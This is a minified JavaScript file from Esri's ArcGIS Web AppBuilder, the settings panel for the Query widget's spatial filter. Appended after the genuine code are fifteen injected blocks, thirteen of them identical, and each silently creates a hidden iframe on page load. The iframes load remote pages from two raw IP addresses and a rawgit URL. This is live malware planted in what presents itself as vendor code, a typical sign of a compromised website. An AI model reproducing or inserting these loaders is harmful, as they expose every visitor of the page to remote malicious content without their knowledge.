// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/setting/SpatialFilterConfig.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"stress"\x3e${nls.spatialFilter}\x3c/div\x3e\r\n\t\x3cdiv class\x3d"spatial-filter-content"\x3e\r\n\t\t\x3cdiv class\x3d"jimu-widget-note" style\x3d"margin-top:5px;"\x3e${nls.spatialFilterTip}\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"spatial-filter-items" style\x3d"margin-top:5px;"\x3e\r\n\t\t\t\x3cdiv class\x3d"spatial-filter-item" data-dojo-attach-point\x3d"mapExtentSection"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"spatial-filter-item-head"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"checkbox-container" data-dojo-attach-point\x3d"cbxMapExtentDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"icon-placeholder"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"make-default" data-dojo-attach-event\x3d"onclick:_onBtnMakeDefaultClicked"\x3e${nls.makeDefault}\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"default-text"\x3e${nls.defaultOption}\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\r\n\t\t\t\x3cdiv class\x3d"spatial-filter-item" data-dojo-attach-point\x3d"drawGraphicSection"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"spatial-filter-item-head"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"checkbox-container cbx-draw-graphic-div" data-dojo-attach-point\x3d"cbxDrawGraphicDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"icon-placeholder arrow-icon" data-dojo-attach-point\x3d"arrowIconDrawGraphic" data-dojo-attach-event\x3d"onclick:_onDrawGraphicArrowIconClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"make-default" data-dojo-attach-event\x3d"onclick:_onBtnMakeDefaultClicked"\x3e${nls.makeDefault}\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"default-text"\x3e${nls.defaultOption}\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"drawGraphicSettting" class\x3d"draw-graphic-setting hidden-setting leading-padding20"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"drawing-tools-section"\x3e\r\n\t\t\t\t\t\t\x3cdiv style\x3d"font-weight:bold;"\x3e${nls.drawingTools}\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"drawingToolsContainer" class\x3d"drawing-tools-container" data-dojo-attach-event\x3d"onclick:_onDrawingToolsContainerClicked"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item point" data-geotype\x3d"POINT"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item line" data-geotype\x3d"LINE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item polyline" data-geotype\x3d"POLYLINE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item freehand-polyline" data-geotype\x3d"FREEHAND_POLYLINE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item triangle" data-geotype\x3d"TRIANGLE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item extent" data-geotype\x3d"EXTENT"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item circle" data-geotype\x3d"CIRCLE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item ellipse" data-geotype\x3d"ELLIPSE"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item polygon" data-geotype\x3d"POLYGON"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item freehand-polygon" data-geotype\x3d"FREEHAND_POLYGON"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"draw-item-icon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"search-distance-section" \x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"drawBufferSettingCbxDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"search-distance-div" data-dojo-attach-point\x3d"drawingSearchDistanceDiv" style\x3d"margin-top:5px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\r\n\t\t\t\x3cdiv class\x3d"spatial-filter-item" data-dojo-attach-point\x3d"useFeaturesSection"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"spatial-filter-item-head"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"checkbox-container cbx-use-features-div" data-dojo-attach-point\x3d"cbxUseFeaturesDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"icon-placeholder arrow-icon" data-dojo-attach-point\x3d"arrowIconFeatures" data-dojo-attach-event\x3d"onclick:_onFeaturesArrowIconClicked"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"make-default" data-dojo-attach-event\x3d"onclick:_onBtnMakeDefaultClicked"\x3e${nls.makeDefault}\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"default-text"\x3e${nls.defaultOption}\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"featuresSetting" class\x3d"features-setting hidden-setting leading-padding20"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"relationships-section" style\x3d"margin-top:10px;"\x3e\r\n\t\t\t\t\t\t\x3cdiv style\x3d"font-weight:bold;"\x3e${nls.availableSpatialRelationships}\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"relationships-selector-div"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"relationshipTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox" data-dojo-props\x3d\'required:true,trim:true,disabled:true\'\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv class\x3d"setting-btn jimu-float-trailing" data-dojo-attach-event\x3d"onclick:_onBtnRelationshipClicked"\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-setting"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"search-distance-section" style\x3d"margin-top:10px;"\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"featureBufferSettingCbxDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"search-distance-div" data-dojo-attach-point\x3d"featuresSearchDistanceDiv" style\x3d"margin-top:5px;"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\t\r\n\t\t\t\x3cdiv class\x3d"spatial-filter-item" data-dojo-attach-point\x3d"layerExtentSection"\x3e\r\n\t\t\t\t\x3cdiv class\x3d"spatial-filter-item-head"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"checkbox-container" data-dojo-attach-point\x3d"cbxLayerExtentDiv"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"icon-placeholder"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"make-default" data-dojo-attach-event\x3d"onclick:_onBtnMakeDefaultClicked"\x3e${nls.makeDefault}\x3c/div\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"default-text"\x3e${nls.defaultOption}\x3c/div\x3e\r\n\t\t\t\t\x3c/div\x3e\r\n\t\t\t\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./SpatialFilterConfig.html dojo/on dojo/query dojo/_base/lang dojo/_base/html dojo/_base/array ./SearchDistance ./RelationshipsSelector jimu/utils jimu/dijit/Popup jimu/dijit/CheckBox".split(" "),function(l,m,n,p,q,h,f,d,c,e,k,r,t,u,g){return l([m,n,p],{baseClass:"jimu-query-setting-spatialfilter-config",templateString:q,_allRelationshipInfos:null,nls:null,config:null,postCreate:function(){this.inherited(arguments);
this._allRelationshipInfos=[{relationship:"SPATIAL_REL_WITHIN",nls:this.nls.contain,label:this.nls.contain},{relationship:"SPATIAL_REL_CROSSES",nls:this.nls.cross,label:this.nls.cross},{relationship:"SPATIAL_REL_ENVELOPEINTERSECTS",nls:this.nls.envelopeIntersect,label:this.nls.envelopeIntersect},{relationship:"SPATIAL_REL_INDEXINTERSECTS",nls:this.nls.indexIntersect,label:this.nls.indexIntersect},{relationship:"SPATIAL_REL_INTERSECTS",nls:this.nls.intersect,label:this.nls.intersect},{relationship:"SPATIAL_REL_OVERLAPS",
nls:this.nls.overlap,label:this.nls.overlap},{relationship:"SPATIAL_REL_TOUCHES",nls:this.nls.touch,label:this.nls.touch},{relationship:"SPATIAL_REL_CONTAINS",nls:this.nls.within,label:this.nls.within}];this._initSelf();this.reset();this.config&&this.setConfig(this.config)},setConfig:function(a){this.reset();this.config=d.clone(a);this.config.currentMapExtent?(this.cbxMapExtent.check(),this.config.currentMapExtent["default"]?this._makeDefaultItem(this.mapExtentSection):this._makeNotDefaultItem(this.mapExtentSection)):
this.cbxMapExtent.uncheck();this.config.drawing?(this.cbxDrawGraphic.check(),this.config.drawing["default"]?this._makeDefaultItem(this.drawGraphicSection):this._makeNotDefaultItem(this.drawGraphicSection),this._selectDrawingTools(this.config.drawing.geometryTypes),this.config.drawing.buffer?(this.cbxDrawBufferSetting.check(),this.drawingSearchDistance.setConfig(this.config.drawing.buffer)):this.cbxDrawBufferSetting.uncheck()):this.cbxDrawGraphic.uncheck();this.config.useFeatures?(this.cbxUseFeatures.check(),
this.config.useFeatures["default"]?this._makeDefaultItem(this.useFeaturesSection):this._makeNotDefaultItem(this.useFeaturesSection),this._setRelationshipsForTextBox(this.config.useFeatures.relationships),this.config.useFeatures.buffer?(this.cbxFeatureBufferSetting.check(),this.featuresSearchDistance.setConfig(this.config.useFeatures.buffer)):this.cbxFeatureBufferSetting.uncheck()):this.cbxUseFeatures.uncheck();this.config.fullLayerExtent?(this.cbxLayerExtent.check(),this.config.fullLayerExtent["default"]?
this._makeDefaultItem(this.layerExtentSection):this._makeNotDefaultItem(this.layerExtentSection)):this.cbxLayerExtent.uncheck();e.forEach([this.cbxMapExtent,this.cbxDrawGraphic,this.cbxUseFeatures,this.cbxLayerExtent],d.hitch(this,function(a){a.labelNode&&c.addClass(a.labelNode,"light-stress")}));this._hideDrawGraphicSettting();this._hideFeaturesSetting()},getConfig:function(){var a={currentMapExtent:null,drawing:null,useFeatures:null,fullLayerExtent:null};this.cbxMapExtent.getValue()&&(a.currentMapExtent=
{"default":this._isDefaultItem(this.mapExtentSection)});if(this.cbxDrawGraphic.getValue()&&(a.drawing={"default":!1,geometryTypes:[],buffer:null},a.drawing["default"]=this._isDefaultItem(this.drawGraphicSection),a.drawing.geometryTypes=this._getSelectedDrawingTools(),this.cbxDrawBufferSetting.getValue())){var b=this.drawingSearchDistance.getConfig();if(!b)return;a.drawing.buffer=b}if(this.cbxUseFeatures.getValue()&&(a.useFeatures={"default":!1,relationships:[],buffer:null},a.useFeatures["default"]=
this._isDefaultItem(this.useFeaturesSection),a.useFeatures.relationships=this._getRelationshipsFromTextBox(),this.cbxFeatureBufferSetting.getValue())){b=this.featuresSearchDistance.getConfig();if(!b)return;a.useFeatures.buffer=b}this.cbxLayerExtent.getValue()&&(a.fullLayerExtent={"default":this._isDefaultItem(this.layerExtentSection)});return a},reset:function(){this.cbxMapExtent.uncheck();this.cbxDrawGraphic.uncheck();this._selectDrawingTools(["POINT","POLYLINE","EXTENT"]);this.drawingSearchDistance.reset();
this._hideDrawGraphicSettting();this.cbxUseFeatures.uncheck();this._resetToDefaultRelationshipForTextBox();this.featuresSearchDistance.reset();this._hideFeaturesSetting();this.cbxLayerExtent.uncheck()},_initSelf:function(){this.cbxMapExtent=new g({label:this.nls.useCurrentExtentTip,onChange:d.hitch(this,function(){this._onCbxChanged(this.cbxMapExtent,this.mapExtentSection)})});this.cbxMapExtent.placeAt(this.cbxMapExtentDiv);this.cbxDrawGraphic=new g({label:this.nls.useDrawGraphicTip,onChange:d.hitch(this,
function(a){a?this._showDrawGraphicSettting():this._hideDrawGraphicSettting();this._onCbxChanged(this.cbxDrawGraphic,this.drawGraphicSection)})});this.cbxDrawGraphic.placeAt(this.cbxDrawGraphicDiv);this.cbxUseFeatures=new g({label:this.nls.useFeaturesTip,onChange:d.hitch(this,function(a){a?this._showFeaturesSetting():this._hideFeaturesSetting();this._onCbxChanged(this.cbxUseFeatures,this.useFeaturesSection)})});this.cbxUseFeatures.placeAt(this.cbxUseFeaturesDiv);this.cbxLayerExtent=new g({label:this.nls.noSpatialLimitTip,
onChange:d.hitch(this,function(){this._onCbxChanged(this.cbxLayerExtent,this.layerExtentSection)})});this.cbxLayerExtent.placeAt(this.cbxLayerExtentDiv);this.drawingSearchDistance=new k({nls:this.nls});this.drawingSearchDistance.placeAt(this.drawingSearchDistanceDiv);this.cbxDrawBufferSetting=new g({label:this.nls.bufferSettings});c.addClass(this.cbxDrawBufferSetting.domNode,"buffer-checkbox");this.own(h(this.cbxDrawBufferSetting,"change",d.hitch(this,function(){this.cbxDrawBufferSetting.getValue()?
this.drawingSearchDistance.enable():this.drawingSearchDistance.disable()})));this.cbxDrawBufferSetting.placeAt(this.drawBufferSettingCbxDiv);this.featuresSearchDistance=new k({nls:this.nls});this.featuresSearchDistance.placeAt(this.featuresSearchDistanceDiv);this.cbxFeatureBufferSetting=new g({label:this.nls.bufferSettings});c.addClass(this.cbxFeatureBufferSetting.domNode,"buffer-checkbox");this.own(h(this.cbxFeatureBufferSetting,"change",d.hitch(this,function(){this.cbxFeatureBufferSetting.getValue()?
this.featuresSearchDistance.enable():this.featuresSearchDistance.disable()})));this.cbxFeatureBufferSetting.placeAt(this.featureBufferSettingCbxDiv)},_onCbxChanged:function(a,b){a.getValue()?0===f(".spatial-filter-item.default",this.domNode).length&&this._makeDefaultItem(b):this._makeNotDefaultItem(b)},_onBtnMakeDefaultClicked:function(a){if(a=t.getAncestorDom(a.target||a.srcElement,d.hitch(this,function(a){return c.hasClass(a,"spatial-filter-item")}),this.domNode)){var b=this._getCbxBySpatialFiterItemDom(a);
b&&(b.getValue()?this._makeDefaultItem(a):this._makeNotDefaultItem(a))}},_isDefaultItem:function(a){return c.hasClass(a,"default")},_makeDefaultItem:function(a){var b=this._getCbxBySpatialFiterItemDom(a);b&&b.getValue()&&(f(".spatial-filter-item",this.domNode).removeClass("default"),c.addClass(a,"default"))},_makeNotDefaultItem:function(a){var b=e.filter([{spatialFilterItemDom:this.mapExtentSection,cbx:this.cbxMapExtent},{spatialFilterItemDom:this.drawGraphicSection,cbx:this.cbxDrawGraphic},{spatialFilterItemDom:this.useFeaturesSection,
cbx:this.cbxUseFeatures},{spatialFilterItemDom:this.layerExtentSection,cbx:this.cbxLayerExtent}],function(a){return a.cbx.getValue()});0===b.length?f(".spatial-filter-item",this.domNode).removeClass("default"):1===b.length?this._makeDefaultItem(b[0].spatialFilterItemDom):2<=b.length&&(b=e.filter(b,function(b){return b.spatialFilterItemDom!==a}),e.some(b,function(a){return c.hasClass(a.spatialFilterItemDom,"default")})||this._makeDefaultItem(b[0].spatialFilterItemDom))},_getCbxBySpatialFiterItemDom:function(a){var b=
null;a===this.mapExtentSection?b=this.cbxMapExtent:a===this.drawGraphicSection?b=this.cbxDrawGraphic:a===this.useFeaturesSection?b=this.cbxUseFeatures:a===this.layerExtentSection&&(b=this.cbxLayerExtent);return b},_onDrawGraphicArrowIconClicked:function(){c.hasClass(this.drawGraphicSettting,"hidden-setting")?this._showDrawGraphicSettting():this._hideDrawGraphicSettting()},_showDrawGraphicSettting:function(){c.removeClass(this.drawGraphicSettting,"hidden-setting");this._updateDrawGraphicArrowIcon();
c.addClass(this.featuresSetting,"hidden-setting");this._updateFeaturesArrowIcon()},_hideDrawGraphicSettting:function(){c.addClass(this.drawGraphicSettting,"hidden-setting");this._updateDrawGraphicArrowIcon()},_updateDrawGraphicArrowIcon:function(){c.hasClass(this.drawGraphicSettting,"hidden-setting")?c.removeClass(this.arrowIconDrawGraphic,"opened"):c.addClass(this.arrowIconDrawGraphic,"opened")},_onFeaturesArrowIconClicked:function(){c.hasClass(this.featuresSetting,"hidden-setting")?this._showFeaturesSetting():
this._hideFeaturesSetting()},_showFeaturesSetting:function(){c.addClass(this.drawGraphicSettting,"hidden-setting");this._updateDrawGraphicArrowIcon();c.removeClass(this.featuresSetting,"hidden-setting");this._updateFeaturesArrowIcon()},_hideFeaturesSetting:function(){c.addClass(this.featuresSetting,"hidden-setting");this._updateFeaturesArrowIcon()},_updateFeaturesArrowIcon:function(){c.hasClass(this.featuresSetting,"hidden-setting")?c.removeClass(this.arrowIconFeatures,"opened"):c.addClass(this.arrowIconFeatures,
"opened")},_onDrawingToolsContainerClicked:function(a){a=a.target||a.srcElement;var b=null;c.hasClass(a,"draw-item")?b=a:c.hasClass(a,"draw-item-icon")&&(b=a.parentNode);b&&(c.toggleClass(b,"selected"),0===f(".selected",this.drawingToolsContainer).length&&c.addClass(b,"selected"))},_selectDrawingTools:function(a){var b=f(".draw-item",this.drawingToolsContainer);e.forEach(b,d.hitch(this,function(b){var d=b.getAttribute("data-geotype");0<=a.indexOf(d)?c.addClass(b,"selected"):c.removeClass(b,"selected")}))},
_getSelectedDrawingTools:function(){var a=[],a=f(".draw-item.selected",this.drawingToolsContainer);return a=e.map(a,d.hitch(this,function(a){return a.getAttribute("data-geotype")}))},_onBtnRelationshipClicked:function(){var a=this._getRelationshipsFromTextBox(),b=new r({nls:this.nls,allRelationshipInfos:d.clone(this._allRelationshipInfos)}),c=new u({width:640,height:405,titleLabel:this.nls.setSpatialRelationships,content:b,onClose:d.hitch(this,function(){b.destroy();b=null}),buttons:[{label:this.nls.ok,
onClick:d.hitch(this,function(){var a=b.getSelectedRelationships();this._setRelationshipsForTextBox(a);c.close()})},{label:this.nls.cancel,onClick:d.hitch(this,function(){c.close()})}]});b.setSelectedRelationshipInfos(a)},_resetToDefaultRelationshipForTextBox:function(){this._setRelationshipsForTextBox([{relationship:"SPATIAL_REL_INTERSECTS",label:this.nls.intersect}])},_setRelationshipsForTextBox:function(a){this.relationshipTextBox.relationships=d.clone(a);a=e.map(a,function(a){return a.label}).join("; ");
this.relationshipTextBox.set("value",a);this.relationshipTextBox.domNode.title=a},_getRelationshipsFromTextBox:function(){var a=[];this.relationshipTextBox.relationships&&(a=e.map(this.relationshipTextBox.relationships,function(a){return{relationship:a.relationship,label:a.label}}));return a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});